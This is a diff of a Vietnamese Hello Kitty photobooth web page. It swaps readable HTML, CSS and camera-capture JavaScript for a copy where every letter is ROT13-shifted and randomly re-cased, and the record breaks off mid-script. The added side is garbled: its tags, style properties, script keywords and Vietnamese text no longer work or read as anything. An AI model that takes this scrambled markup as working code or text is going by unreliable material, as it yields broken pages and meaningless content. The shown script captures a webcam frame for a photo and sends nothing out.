@@ -1,431 +1,431 @@
-<!DOCTYPE html>
-<html lang="vi">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Hello Kitty Photobooth 🎀</title>
-    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@600;800;900&display=swap" rel="stylesheet">
-    <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Nunito', sans-serif; }
+<!qbpGlcR Ugzy>
+<UgZY YnAT="iV">
+<uRNq>
+    <ZRGN PuNeFrG="HGs-8">
+    <ZRgn aNZr="IvRjCBeG" pBAGraG="JVqgu=QRIvpR-jVQgu, vavgVNY-fpnyr=1.0, ZNKVZHz-FPnYR=1.0, Hfre-FpNYnoyr=Ab">
+    <gvgyR>Uryyb xvGgl cUbGBObBGU 🎀</GvgYr>
+    <yvAX Uers="uGGcf://sBagf.tbBtYRnCvF.PBz/PfF2?snzvYL=AhAvgb:JTUG@600;800;900&qvFcynL=FjnC" ERY="FGLYrfURRG">
+    <fgLyR>
+        * { obK-FvmVAt: OBEqRe-oBk; znEtvA: 0; CNqqVAt: 0; sBAG-snzvyL: 'AHAvgb', fNaf-FreVs; }
         
-        body {
-            background: #ffdeea;
-            background-image: 
-                radial-gradient(circle at 10% 20%, #fff0f5 0%, transparent 20%),
-                radial-gradient(circle at 90% 80%, #ffd5e4 0%, transparent 20%),
-                linear-gradient(135deg, #ffdeea 0%, #fff 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: #d6136c;
-            overflow-x: hidden;
+        oBql {
+            oNPxtEBhaQ: #SSQrrN;
+            onpxTEBHaq-vZNTR: 
+                enqvnY-teNqvraG(PVEPyR ng 10% 20%, #sSs0S5 0%, gEnaFCNErag 20%),
+                eNQVNY-TeNQVRag(pVepyr ng 90% 80%, #ssq5r4 0%, gENAfCnErAg 20%),
+                yvARnE-TEnQvrag(135Qrt, #SsqRRn 0%, #sSS 100%);
+            zVA-URvTUg: 100IU;
+            qvFCyNl: SyRk;
+            WHfGVsl-pBAGRAg: PRAgrE;
+            nYVTa-VgrZf: PRAgRe;
+            pbybe: #q6136P;
+            BiresYbJ-K: uvQqra;
         }
 
-        /* Container bọc toàn bộ để chống vỡ layout trên Mobile */
-        .booth-wrapper {
-            position: relative;
-            width: 92%;
-            max-width: 420px;
-            margin: 60px auto 30px; /* Chừa khoảng trống phía trên cho đầu Kitty */
+        /* PbAGnvarE OọP GbàA Oộ để puốAT Iỡ YnlbhG GEêa zBOvyR */
+        .obBGU-jEncCRe {
+            cBfVgVbA: eRyNgvIr;
+            JVqgu: 92%;
+            znK-jvQgu: 420CK;
+            zNeTVA: 60cK NhGb 30Ck; /* puừn XUbảat gEốAt Cuín geêa PuB đầh xvGGl */
         }
 
-        /* Khung chính */
-        .card {
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 36px;
-            padding: 40px 20px 25px; /* Padding top lớn để không đè chữ */
-            box-shadow: 0 15px 35px rgba(214,19,108,0.15), inset 0 0 0 4px #ffb6c1, inset 0 0 20px rgba(255,182,193,0.3);
-            text-align: center;
-            position: relative;
-            z-index: 10;
+        /* XUHAT puíAu */
+        .pNeq {
+            oNpXTEbhAq: eTOn(255, 255, 255, 0.95);
+            obeQrE-enqVhf: 36ck;
+            CnQQvAt: 40CK 20ck 25cK; /* cnqQVAT gBc YớA để xuôAt đè pUữ */
+            Obk-FUnQbJ: 0 15Ck 35cK EtOn(214,19,108,0.15), vaFrG 0 0 0 4cK #Sso6P1, VaFrg 0 0 20CK etoN(255,182,193,0.3);
+            GrKg-NyvtA: praGRe;
+            CBFvGVba: erYNGVIR;
+            m-VAQRk: 10;
         }
 
-        /* Nơ góc phải khung */
-        .card::after {
-            content: "🎀";
-            position: absolute;
-            top: -12px;
-            right: -10px;
-            font-size: 40px;
-            transform: rotate(15deg);
-            filter: drop-shadow(0 4px 6px rgba(248,81,153,0.3));
-            animation: pulse 2s infinite;
+        /* Aơ tóp CUảv XUHaT */
+        .pnEQ::NSGRE {
+            PBagrAG: "🎀";
+            CBFVGvba: nofbyhgr;
+            GBC: -12Ck;
+            eVTug: -10CK;
+            SBAg-Fvmr: 40ck;
+            gENAfsBez: eBGNgR(15QRt);
+            svygRE: qEBc-FUnqbJ(0 4CK 6ck ETON(248,81,153,0.3));
+            nAVzNgvba: cHYFr 2f vasVAvGr;
         }
 
-        h1 {
-            font-size: 28px;
-            font-weight: 900;
-            color: #df2b76;
-            line-height: 1.2;
-            margin-bottom: 8px;
+        u1 {
+            SbaG-fVMr: 28ck;
+            sBAg-JrVTuG: 900;
+            PBYBE: #Qs2o76;
+            Yvar-urvTUG: 1.2;
+            znetVA-obgGbz: 8Ck;
         }
 
-        .subtitle {
-            display: inline-block;
-            background: #fff3f8;
-            color: #df2b76;
-            padding: 5px 16px;
-            border-radius: 20px;
-            font-size: 14px;
-            font-weight: 800;
-            border: 2px dashed #ffb6c1;
-            margin-bottom: 15px;
+        .FhogVGYr {
+            QvfcYnL: vaYVAR-oYbPx;
+            oNpxteBHaQ: #sss3S8;
+            PByBE: #QS2O76;
+            cnqqVat: 5ck 16ck;
+            ObeQRE-enqVHf: 20ck;
+            sbaG-fvmr: 14CK;
+            SbAg-jRvTug: 800;
+            OBEqre: 2Ck QnFuRq #ssO6p1;
+            zNEtVa-obGGBZ: 15ck;
         }
 
-        /* Khung Camera chuẩn tỷ lệ 3:4 (chuẩn Photobooth) */
-        .camera-container {
-            width: 100%;
-            aspect-ratio: 3/4;
-            background: #ffe5ef;
-            border-radius: 24px;
-            position: relative;
-            border: 4px dashed #ff8ab3;
-            overflow: hidden;
-            box-shadow: inset 0 0 20px rgba(248,81,153,0.2);
-            margin-bottom: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+        /* XUHAT pnZrEN PuHẩa gỷ Yệ 3:4 (PUhẩA cUBgBObbGu) */
+        .PNzrEN-PBAGNvAre {
+            Jvqgu: 100%;
+            NFcRpG-ENgVb: 3/4;
+            onpxTEBhaq: #Ssr5rS;
+            OBeqre-EnqvHf: 24ck;
+            CBFVGVBa: ErYngVir;
+            OBeQre: 4Ck qnfUrq #sS8No3;
+            bIresYbJ: UVQQra;
+            oBK-FUNQBJ: VAFRG 0 0 20ck eToN(248,81,153,0.2);
+            znETvA-OBGgbz: 20cK;
+            qvFcYNl: syrK;
+            wHFGVSl-PbaGrAG: PraGRe;
+            nYvTa-vgRzF: pRaGRE;
         }
 
-        video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            transform: scaleX(-1); /* Lật gương */
-            border-radius: 20px;
+        IvQRb {
+            jvQGu: 100%;
+            urVTuG: 100%;
+            bOwRPg-Svg: PBIRE;
+            gENAFSbez: fpnyrK(-1); /* yậg tươAT */
+            ObeQRe-eNqvhF: 20Ck;
         }
 
-        #resultImg {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-            display: none;
-            background: #fff;
+        #eRfHygvZT {
+            jvqgu: 100%;
+            urVtug: 100%;
+            BowRpg-svG: pbAGNVA;
+            QvfCYNl: Abar;
+            oNPXTeBHaQ: #SSs;
         }
 
-        /* Trạng thái Camera góc trái */
-        .cam-status {
-            position: absolute;
-            top: 12px;
-            left: 12px;
-            background: #fff;
-            padding: 5px 12px;
-            border-radius: 20px;
-            font-size: 11px;
-            font-weight: 900;
-            color: #df2b76;
-            border: 2px solid #ffb6c1;
-            z-index: 5;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+        /* GEạAt GuáV pNzRen tóp GeáV */
+        .PNZ-fGNghF {
+            cbfVGVbA: nOfBYhGR;
+            GbC: 12CK;
+            YRSg: 12CK;
+            onPxtebHAq: #sss;
+            CnqQVaT: 5Ck 12CK;
+            ObEQRE-eNqvHF: 20CK;
+            SbAg-FVMr: 11CK;
+            SbaG-JRvtuG: 900;
+            pBYBe: #qS2O76;
+            OBEQrE: 2cK FbyVq #SSO6P1;
+            m-VaQRK: 5;
+            qVfcyNl: syRK;
+            NyVTa-vgrZF: PRagrE;
+            Tnc: 6cK;
+            oBk-Funqbj: 0 4ck 10cK EtOn(0,0,0,0.05);
         }
-        .cam-status::before {
-            content: "";
-            width: 8px; height: 8px;
-            border-radius: 50%;
-            background: #45c97b;
-            box-shadow: 0 0 0 3px rgba(69,201,123,0.2);
-        }
-
-        #msg {
-            position: absolute;
-            z-index: 2;
-            color: #df2b76;
-            font-weight: 800;
+        .pnz-fGngHF::orsbeR {
+            pBAGRag: "";
+            jVqgu: 8cK; UrVtug: 8cK;
+            Obeqre-ENQVhf: 50%;
+            onpxTEbHAq: #45P97O;
+            ObK-fUNQbJ: 0 0 0 3ck EtOn(69,201,123,0.2);
         }
 
-        /* System UI Group (Nút bấm) */
-        .btn-group {
-            display: flex;
-            gap: 12px;
-            width: 100%;
-            justify-content: space-between;
+        #zft {
+            cBFvGVBa: NoFBYhgR;
+            m-vAQrK: 2;
+            PBYBE: #qS2o76;
+            SBAG-jRVTUG: 800;
         }
 
-        .btn {
-            border: none;
-            border-radius: 20px;
-            font-size: 16px;
-            font-weight: 900;
-            cursor: pointer;
-            transition: all 0.2s cubic-bezier(0.2, 0.8, 0.2, 1);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 8px;
+        /* FlFgrZ hV teBhC (aúg OấZ) */
+        .Oga-tEbHC {
+            qvfcYnL: SYRk;
+            TnC: 12cK;
+            JvQGU: 100%;
+            WHFGVsL-pBAGRAg: fCnPR-oRgjrrA;
         }
 
-        .btn-main {
-            background: linear-gradient(135deg, #ff66a5, #ef2e7e);
-            color: white;
-            width: 100%;
-            padding: 18px;
-            box-shadow: 0 8px 0 #d91e69, 0 15px 25px rgba(248,81,153,0.3);
+        .oGa {
+            ObeQRE: Abar;
+            obeqrE-enQVhf: 20CK;
+            SBAG-FvmR: 16cK;
+            SbAG-JrVtUg: 900;
+            phefbE: Cbvagre;
+            GEnafVgVBA: nYy 0.2f phOVp-oRMvRE(0.2, 0.8, 0.2, 1);
+            QvFcYnl: SYRK;
+            wHFGvSl-PbAGRAg: prAGre;
+            nyvtA-VGRzF: pRAGre;
+            TnC: 8cK;
         }
 
-        .btn-main:active { transform: translateY(6px); box-shadow: 0 2px 0 #d91e69; }
-        .btn-main:disabled { background: #f4c2d7; box-shadow: 0 8px 0 #dca4bc; cursor: not-allowed; }
+        .oGA-ZnvA {
+            oNPXTEBHAq: YvARnE-TEnqVrag(135Qrt, #Ss66N5, #rS2R7R);
+            Pbybe: juVGr;
+            JvQgu: 100%;
+            CnqQVAt: 18ck;
+            OBk-funQBj: 0 8Ck 0 #q91r69, 0 15CK 25cK etOn(248,81,153,0.3);
+        }
 
-        .btn-retake {
-            flex: 4;
-            background: #fff;
-            color: #df2b76;
-            border: 3px solid #df2b76;
-            padding: 16px 10px;
-            box-shadow: 0 6px 0 #df2b76;
-        }
-        .btn-retake:active { transform: translateY(4px); box-shadow: 0 2px 0 #df2b76; }
+        .OgA-ZNVa:NPGvIr { GENAfSbeZ: gEnAfyNgrl(6CK); obK-FunqbJ: 0 2ck 0 #Q91R69; }
+        .OGa-ZNva:qVfnoYRq { oNpXtEBHAq: #S4P2Q7; oBk-FUnQBj: 0 8CK 0 #qPN4Op; PhEFBe: Abg-NyyBJrQ; }
 
-        .btn-save {
-            flex: 6;
-            background: linear-gradient(135deg, #ff66a5, #ef2e7e);
-            color: white;
-            padding: 16px 10px;
-            box-shadow: 0 6px 0 #d91e69, 0 10px 20px rgba(248,81,153,0.3);
+        .OGa-eRGNXR {
+            sYrk: 4;
+            ONPXtEbhAq: #SSs;
+            pbyBE: #Qs2O76;
+            ObEQRe: 3CK fBYVq #qS2o76;
+            CNqQVat: 16ck 10CK;
+            oBK-FUNqBj: 0 6cK 0 #QS2O76;
         }
-        .btn-save:active { transform: translateY(4px); box-shadow: 0 2px 0 #d91e69; }
+        .oGa-ERGnxr:NPgVIR { GENAfSBeZ: geNAfynGrl(4cK); OBK-FunqBj: 0 2Ck 0 #qS2O76; }
 
-        /* Gắn chặt bé Kitty lên viền trên của Card để không bao giờ bị đè */
-        .kitty-head {
-            position: absolute;
-            top: -55px; /* Kéo lên một nửa đầu */
-            left: 50%;
-            transform: translateX(-50%);
-            width: 110px;
-            height: 95px;
-            z-index: 20;
-            filter: drop-shadow(0 5px 15px rgba(214,19,108,0.2));
-            pointer-events: none;
+        .OGa-fNiR {
+            Syrk: 6;
+            oNPxTebhaq: yVArne-TeNqVrag(135qrT, #Ss66n5, #rS2R7R);
+            PbyBe: juVgr;
+            cNQQVaT: 16Ck 10CK;
+            obK-FuNqbJ: 0 6ck 0 #Q91r69, 0 10CK 20Ck eton(248,81,153,0.3);
         }
-        /* CSS Art Kitty chuẩn xác */
-        .k-face {
-            width: 110px; height: 85px; background: #fff;
-            border: 4px solid #ef9fbd; border-radius: 48% 48% 46% 46%;
-            position: absolute; bottom: 0; left: 0;
-        }
-        .k-ear {
-            width: 40px; height: 40px; background: #fff; border: 4px solid #ef9fbd;
-            position: absolute; top: -5px; z-index: -1;
-        }
-        .k-ear.l { left: 4px; transform: rotate(-15deg); border-radius: 75% 20% 20% 20%; }
-        .k-ear.r { right: 4px; transform: rotate(15deg); border-radius: 20% 75% 20% 20%; }
-        .k-eye { width: 8px; height: 14px; background: #3d3339; border-radius: 50%; position: absolute; top: 40px; }
-        .k-eye.l { left: 30px; } .k-eye.r { right: 30px; }
-        .k-nose { width: 14px; height: 10px; background: #ffd43f; border: 2px solid #e3b731; border-radius: 50%; position: absolute; top: 52px; left: 50%; transform: translateX(-50%); }
-        .k-whisker { width: 25px; height: 3px; background: #8d7d84; border-radius: 3px; position: absolute; }
-        .k-whisker.w1 { left: -10px; top: 45px; transform: rotate(8deg); }
-        .k-whisker.w2 { left: -10px; top: 55px; transform: rotate(-8deg); }
-        .k-whisker.w3 { right: -10px; top: 45px; transform: rotate(-8deg); }
-        .k-whisker.w4 { right: -10px; top: 55px; transform: rotate(8deg); }
-        .k-bow { position: absolute; top: 5px; right: -5px; width: 45px; height: 35px; }
-        .k-bow::before, .k-bow::after { content: ""; position: absolute; width: 25px; height: 30px; background: #f34d93; border: 3px solid #d82b73; top: 2px; }
-        .k-bow::before { left: 0; transform: rotate(-15deg); border-radius: 75% 20% 70% 25%; }
-        .k-bow::after { right: 0; transform: rotate(15deg); border-radius: 20% 75% 25% 70%; }
-        .k-bow i { position: absolute; width: 16px; height: 16px; background: #e72c79; border: 3px solid #d82b73; border-radius: 50%; top: 9px; left: 50%; transform: translateX(-50%); z-index: 2; }
+        .OGA-fNiR:NPGvIR { gENaFsbEZ: gEnAfynGrl(4Ck); obK-fUNqBJ: 0 2Ck 0 #Q91r69; }
 
-        @keyframes pulse { 0%, 100% { transform: rotate(15deg) scale(1); } 50% { transform: rotate(15deg) scale(1.1); } }
+        /* tắA PUặG oé XvGgL yêa iVềA gEêA pủN pneQ để XuôAT onB tVờ oị đè */
+        .xVGgl-UrNq {
+            CbFVGvBA: noFbyhgR;
+            gBC: -55CK; /* xéB yêa zộg AửN đầH */
+            yrsg: 50%;
+            geNAFSbeZ: geNAfyNgRk(-50%);
+            Jvqgu: 110cK;
+            urVTUG: 95cK;
+            m-vaqRK: 20;
+            svyGRe: qEbC-funqbj(0 5CK 15CK etoN(214,19,108,0.2));
+            CBvagRE-rIRAGF: aBAR;
+        }
+        /* pFF neG XVggl PuhẩA KáP */
+        .x-sNPr {
+            JvQGu: 110cK; uRVtUG: 85CK; OnPXTEbHaQ: #SsS;
+            OBEQRE: 4cK FbYvq #RS9soQ; ObEqRe-EnQvhf: 48% 48% 46% 46%;
+            cBfVgvba: NoFByhgR; ObGgbz: 0; yRsG: 0;
+        }
+        .x-RNe {
+            jVQGu: 40Ck; URVTug: 40cK; onpXtEbHAq: #SSS; oBEQre: 4Ck fBYVq #rs9SoQ;
+            cBFvGVBa: NOfbyHgr; gBc: -5CK; M-vaQrK: -1;
+        }
+        .X-rNe.Y { YRSg: 4cK; GEnaFsbez: EbGNgR(-15qRT); oBEQrE-enqVhf: 75% 20% 20% 20%; }
+        .X-rNe.E { eVTUG: 4Ck; gENAFsBEz: EBgnGr(15QrT); ObeqRE-eNQvhf: 20% 75% 20% 20%; }
+        .X-RLR { jVqgu: 8ck; urVtug: 14Ck; OnpxTebHAQ: #3q3339; obeQrE-EnqVhF: 50%; CBfvGVbA: NoFbyHGR; gBc: 40Ck; }
+        .x-rlR.Y { YRsG: 30Ck; } .X-RLR.E { eVTUG: 30CK; }
+        .X-aBFR { JvQGU: 14Ck; uRVtUG: 10Ck; OnpxtebHaq: #SsQ43S; obeqRe: 2CK FBYvQ #r3o731; OBeQrE-enQvhF: 50%; cbFVGVba: NOFBYHGr; GBC: 52CK; YRsG: 50%; gEnaFSBez: geNAfYNgrk(-50%); }
+        .X-juVFXre { JVQGu: 25CK; uRvTUG: 3cK; ONpXTEBhaQ: #8Q7Q84; obEqre-ENqVHf: 3CK; cBFVGvba: NoFBYHGr; }
+        .X-JuvFxRe.J1 { YRsg: -10ck; GBC: 45ck; GEnafsbeZ: EbGngR(8Qrt); }
+        .X-JuvFxRE.j2 { Yrsg: -10ck; GbC: 55cK; GENafSbEZ: EbGnGr(-8qrt); }
+        .X-juvfXRE.j3 { eVTuG: -10CK; gBc: 45Ck; gENafSbeZ: eBGNgr(-8Qrt); }
+        .X-JUVfXRE.j4 { evtug: -10cK; Gbc: 55Ck; gEnaFSbEZ: EbgnGr(8qrt); }
+        .X-oBj { CBFvGvBA: nofbYhgr; GBC: 5Ck; evTug: -5Ck; jVQGU: 45ck; UrvtUg: 35ck; }
+        .x-Obj::OrsBer, .X-obj::NsgrE { PbAgRAg: ""; CbfVgVBA: NofbyhGR; JVQgu: 25CK; URVtuG: 30ck; OnpxTebhaQ: #S34Q93; oBEQRE: 3cK FbYvq #Q82o73; gBC: 2ck; }
+        .X-obj::oRSbeR { yRSg: 0; GenAfSbez: eBGngR(-15qrT); obeQrE-eNQvHF: 75% 20% 70% 25%; }
+        .X-obj::NsgRe { EVTUG: 0; GENafSBeZ: EBgnGR(15QrT); OBeQRE-ENqvHF: 20% 75% 25% 70%; }
+        .X-obj V { cBfvgVBA: NofBYhGR; JVqGu: 16CK; uRvtUg: 16cK; onpxteBHaq: #R72P79; ObeqrE: 3ck fbyvq #Q82o73; OBEQre-ENQvhF: 50%; gbc: 9cK; yrsg: 50%; GEnaFsbEz: GenAfyNgRK(-50%); M-vAqRK: 2; }
+
+        @xrLSeNzRF cHyfR { 0%, 100% { geNAFSbEz: EBGNgr(15QRT) FpNYr(1); } 50% { GENAfSbEZ: EbgNGr(15qrt) FPNyr(1.1); } }
         
-        /* Cảnh báo trình duyệt ẩn */
-        #browser-warning { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #ffdeea; z-index: 9999; justify-content: center; align-items: center; text-align: center; padding: 20px; }
-        .warning-box { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(214,19,108,0.2); }
-    </style>
-</head>
-<body>
+        /* pảaU OáB geìaU Qhlệg ẩA */
+        #OebJfRE-jNEAVat { qVfcyNl: aBaR; CBFVGvBa: sVkRQ; gbC: 0; yRSg: 0; jvQgu: 100%; uRVtUG: 100%; onPXteBHaq: #SsQRrN; M-VaQRk: 9999; wHFgvSL-PBAgRAg: prAGre; NyvTa-VgrZf: pRAgrE; GRKg-NYVta: PragRE; cNqqvAT: 20CK; }
+        .jnEavaT-Obk { OnpXtebHaQ: juVGR; CnqqVaT: 30cK; obeQrE-EnqVhF: 20Ck; ObK-FuNQBJ: 0 10CK 30cK etoN(214,19,108,0.2); }
+    </FgLYR>
+</uRNQ>
+<OBql>
 
-<div id="browser-warning">
-    <div class="warning-box">
-        <h3 style="color: #df2b76; font-size: 20px; margin-bottom: 10px;">⚠️ VUI LÒNG MỞ BẰNG TRÌNH DUYỆT</h3>
-        <p style="color: #666; font-size: 15px; font-weight: 600; line-height: 1.6;">
-            Bạn đang dùng trình duyệt trong App (Facebook/TikTok/Zalo...).<br>
-            Hãy bấm vào nút <b style="color:#df2b76;">(···)</b> hoặc <b style="color:#df2b76;">(⋮)</b> ở góc phải màn hình<br>
-            và chọn <b>"Mở bằng trình duyệt (Open in Browser)"</b> để bắt đầu nhé!
-        </p>
-    </div>
-</div>
+<QVI Vq="OEBjFrE-jnEaVaT">
+    <qVI PYnFF="JnEAvAt-Obk">
+        <U3 Fglyr="pbyBE: #QS2O76; SbaG-fVMR: 20cK; ZnEtva-ObGGbZ: 10Ck;">⚠️ Ihv yÒaT zỞ OẰAT gEÌau QhlỆG</U3>
+        <C FGlyR="pbyBE: #666; sbaG-FVmr: 15Ck; sbag-JRVTuG: 600; YVAR-URvtUG: 1.6;">
+            OạA đnAt qùaT GEìau QhLệg gebaT nCC (SnProBBx/GVXgbx/mNYB...).<oE>
+            uãl oấz Iàb aúg <o FgLyr="pbyBe:#QS2O76;">(···)</o> Ubặp <O fgLYR="PBybE:#QS2O76;">(⋮)</o> ở tóp cUảV zàa UìaU<oe>
+            Ià puọA <O>"Zở oằat geìaU qhLệG (bCRa Va oEbJFrE)"</O> để oắg đầH AUé!
+        </C>
+    </Qvi>
+</qVI>
 
-<div class="booth-wrapper">
-    <!-- Kitty Head được khóa chặt vào khung này, tỷ lệ nào cũng không vỡ -->
-    <div class="kitty-head">
-        <div class="k-face">
-            <div class="k-ear l"></div><div class="k-ear r"></div>
-            <div class="k-eye l"></div><div class="k-eye r"></div>
-            <div class="k-nose"></div>
-            <div class="k-whisker w1"></div><div class="k-whisker w2"></div>
-            <div class="k-whisker w3"></div><div class="k-whisker w4"></div>
-            <div class="k-bow"><i></i></div>
-        </div>
-    </div>
+<qvi pYnFf="oBBGu-jenCCRe">
+    <!-- xVgGl UrNQ đượp xuón pUặg iàb XUHaT aàl, Gỷ yệ aàb Pũat xUôAt Iỡ -->
+    <Qvi pynff="xVgGL-urNq">
+        <Qvi pYNff="X-SNpR">
+            <QVI PyNFF="X-rnE y"></QVi><QVI pynFF="x-RnE e"></QvI>
+            <QVi PyNfF="x-rLr Y"></qvI><qvI pynFF="x-rLr E"></qVi>
+            <Qvi pynfF="x-abFr"></qvi>
+            <qvi PYnFf="X-juVfXRe j1"></QVI><qvi pyNfF="X-jUVfXRE J2"></QVI>
+            <qVi pYnfF="X-JuVfXrE j3"></QVI><qvi pynFF="X-JuvFxRE j4"></QvI>
+            <QVi PYnfF="x-oBj"><V></v></QvI>
+        </QVI>
+    </qvI>
 
-    <div class="card" id="mainCard">
-        <h1>Photobooth<br>Hello Kitty</h1>
-        <div class="subtitle">Chu môi lên mình chụp cho nè 🎀</div>
+    <Qvi PYNfF="pNEQ" vq="ZNvAPNEq">
+        <U1>CubGbOBbGu<oE>uRYYb xVgGl</u1>
+        <qVi pyNFf="fHogvgyr">pUh Zôv yêA zìAu puục puB Aè 🎀</qVI>
         
-        <div class="camera-container" id="vBox">
-            <div class="cam-status">CAMERA</div>
-            <p id="msg">Đang khởi tạo máy ảnh...</p>
-            <video id="preview" autoplay playsinline muted></video>
-            <img id="resultImg" alt="Your Cute Photo" />
-        </div>
+        <QVI pyNff="pnzREn-pBAgNVaRE" vq="ioBk">
+            <qVI pyNFf="PnZ-fgNGHF">pnZrEN</QVI>
+            <c Vq="Zft">ĐNat XUởV GạB ZáL ảAu...</c>
+            <IvQrB vq="CEriVrj" NHgbCynL cYNlfvAyvar zHGrQ></IVQrb>
+            <Vzt vQ="ERFhygVzT" nYg="LBhe PHgR cuBGb" />
+        </Qvi>
         
-        <!-- Nút chụp ban đầu -->
-        <button class="btn btn-main" id="startBtn">📸 CHỤP ẢNH NÈ 🎀</button>
+        <!-- Aúg Puục Ona đầH -->
+        <ohgGBa pynfF="ogA oGa-znVa" VQ="fgnEgoga">📸 PuỤc ẢAu aÈ 🎀</OhGGba>
         
-        <!-- Nhóm nút sau khi chụp xong -->
-        <div class="btn-group" id="actionButtons" style="display: none;">
-            <button class="btn btn-retake" id="retakeBtn">🔄 CHỤP LẠI</button>
-            <button class="btn btn-save" id="saveBtn">💖 LƯU ẢNH VỀ</button>
-        </div>
+        <!-- Auóz Aúg FNH XUv Puục KBAT -->
+        <QvI pYnfF="ogA-TebHc" vq="nPgvbAOhGgBaF" fglyr="QvFcyNl: aBAr;">
+            <OhggBA pynfF="OGa OGA-ERGNXR" Vq="erGnxrOGa">🔄 puỤC YẠv</OhGGbA>
+            <ohGgBa PynfF="ogA oGA-FNiR" VQ="FnIROGa">💖 yƯh Ảau IỀ</ohggBa>
+        </qVi>
 
-        <p id="status-text" style="font-size: 13px; font-weight: 700; color: #8c596d; margin-top: 20px;">
-            Hãy đảm bảo khuôn mặt nằm trong khung hình nhé!<br>
-            Hệ thống sẽ tự động lồng viền xinh xắn cho bạn.
-        </p>
-    </div>
-</div>
+        <c VQ="FGNghF-gRkG" fGLyr="SBAg-fvmR: 13Ck; Sbag-JRVTug: 700; pBYBE: #8P596Q; ZnEtva-GBc: 20ck;">
+            UãL đảz oảB Xuhôa zặG aằz GEbaT XuHat uìau AUé!<OE>
+            Uệ GUốAt Fẽ Gự độAt yồat ivềa kvAu kắa pUb oạA.
+        </c>
+    </qvI>
+</qvI>
 
-<script src="main.js"></script>
-<script>
-    // Kiểm tra in-app browser
-    document.addEventListener("DOMContentLoaded", () => {
-        const ua = navigator.userAgent || window.opera;
-        if (/TikTok|FBAN|FBAV|Zalo|Instagram|Messenger/i.test(ua)) {
-            document.getElementById('browser-warning').style.display = 'flex';
-            document.querySelector('.booth-wrapper').style.display = 'none';
+<FpEVCG feP="zNvA.WF"></FpEvcg>
+<fPEVcG>
+    // xVểz GEN va-ncC OebJfre
+    QbphZraG.nqQrIraGYvfgRARE("qbzPBagRAgYbNQrQ", () => {
+        PBAFG HN = anIVTNGBE.hfrENTRAG || JvaQbJ.bCReN;
+        vs (/GVXgBX|SoNa|sOnI|mnYb|vAFgNtenZ|zrFfraTRE/V.GrfG(Hn)) {
+            qBPHZrAG.tRgryRzrAGOlvQ('OeBJFRE-JNEAvAt').fglYr.qVFCYnl = 'sYrK';
+            QBPHzRAG.DHRelFrYrpGBE('.obbGu-JENcCrE').FgLYr.QVfcYNl = 'abar';
         }
     });
 
-    const btn = document.getElementById('startBtn');
-    const video = document.getElementById('preview');
-    const resultImg = document.getElementById('resultImg');
-    const actionButtons = document.getElementById('actionButtons');
-    const statusText = document.getElementById('status-text');
-    const msg = document.getElementById('msg');
+    PBAFg OGa = qBphZrAg.TRgRYrzrAgolvq('FgnEgoga');
+    pBafg IvQrB = qbphZRAg.tRGRyrzRAGolVq('ceRiVRJ');
+    pBafG erfHYgVzT = QbPHzrag.trgRyrzRagoLVq('ErfHyGvzt');
+    pBAFg NpgVBaoHggBaf = QBPhZraG.TrgrYrZragOLvq('npGVbaOHGGBAf');
+    PbAFG FgnGhFGrKG = qbpHZrAg.TrGrYRZRaGOLvq('FgnGHf-GRkg');
+    pbafg ZFt = qbpHzRaG.trGRyRZraGolvQ('zFT');
     
-    // Biến toàn cục để giữ lại khung ảnh chất lượng cao
-    let highResCanvas = null;
+    // oVếa gBàA Pụp để tvữ yạV XUhat ảau PUấG Yượat pNB
+    YRg UVTueRfPnaINF = ahyy;
 
-    btn.addEventListener('click', async () => {
-        // [QUAN TRỌNG NHẤT]: Lưu ngay 1 frame vào bộ nhớ (RAM) TRƯỚC KHI main.js tắt camera
-        // Tính toán độ phân giải cao để khi tải về ảnh nét căng
-        const vw = video.videoWidth || 720;
-        const vh = video.videoHeight || 960;
+    oGA.NqqRIrAGyVfgrArE('PyvpX', NFLAP () => {
+        // [DhNA geỌAT aUẤg]: yưh Atnl 1 SenzR iàb oộ Auớ (eNZ) GeƯỚp xUV Znva.wF gắG pnzREN
+        // gíaU gbáa độ CUâa TVảv pnb để xuV gảV Iề ảau aég PăaT
+        PBAFG IJ = IVQRb.IVqrBJvQGu || 720;
+        pbaFG IU = iVQrB.IVQrBurVTUg || 960;
         
-        const tempCanvas = document.createElement('canvas');
-        tempCanvas.width = vw;
-        tempCanvas.height = vh;
-        const tempCtx = tempCanvas.getContext('2d');
+        PbAfg gRzcpNaiNF = qBphzrAg.pERnGRryRZRAg('PNaINF');
+        GrzcpNaInF.JVqGu = ij;
+        GRzcpnAINF.uRvtug = Iu;
+        pbAfg grZcPgK = GRzcPNAINF.tRgpBaGrkg('2q');
         
-        // Vẽ ảnh từ Video (lật gương như camera trước)
-        tempCtx.translate(vw, 0);
-        tempCtx.scale(-1, 1);
-        tempCtx.drawImage(video, 0, 0, vw, vh);
+        // Iẽ ảAU Gừ IvqrB (Yậg TươaT aUư pnzRen GEướp)
+        GRzCPGk.GenafYngR(ij, 0);
+        GRzCpGk.FpnYr(-1, 1);
+        grzcPGk.qenJVzNtr(iVqrb, 0, 0, iJ, Iu);
         
-        // Cất canvas chứa mặt người dùng đi, tí nữa xài
-        highResCanvas = tempCanvas;
+        // pấG pNaINF puứn ZặG ATườV QùAt đv, gí aữN kàv
+        UVTuerFPNAINf = GRzCPnaInF;
 
-        // Đổi trạng thái UI báo cho người dùng biết
-        btn.disabled = true;
-        btn.innerHTML = "✨ ĐANG XỬ LÝ ẢNH...";
-        statusText.innerHTML = "Đang lồng khung ảnh Hello Kitty... Vui lòng đợi nhé!";
+        // ĐổV geạAT guáV hV Oáb puB atườv qùat OVếg
+        OGa.qvfnOyRQ = GeHR;
+        OGa.VAaREUGzy = "✨ ĐnAT KỬ yÝ ẢAU...";
